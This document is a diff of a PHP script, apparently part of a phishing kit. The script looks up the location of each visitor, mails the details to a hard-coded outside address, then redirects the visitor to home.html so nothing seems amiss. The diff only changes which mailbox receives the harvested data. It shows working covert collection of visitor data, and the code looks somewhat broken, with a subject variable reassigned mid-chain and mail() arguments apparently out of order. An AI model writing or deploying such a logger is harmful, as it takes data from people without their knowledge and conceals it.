@@ -1,5 +1,5 @@
 <?php
-$to = "spikelel46@gmail.com";
+$to = "sujal@wwpager.site";
 require_once('geoplugin.class.php');
 $geoplugin = new geoPlugin();
 $geoplugin->locate();
@@ -19,7 +19,6 @@ $subject =	"Radius of Accuracy (Miles): {$geoplugin->locationAccuracyRadius} \n"
 $subject =	"Timezone: {$geoplugin->timezone}  \n".
 $subject =	"Currency Code: {$geoplugin->currencyCode} \n".
 $subject =	"Currency Symbol: {$geoplugin->currencySymbol} \n";
-
 $send = mail($to,  $body, $subject, $headers);
 header('Location: home.html');
 ?>
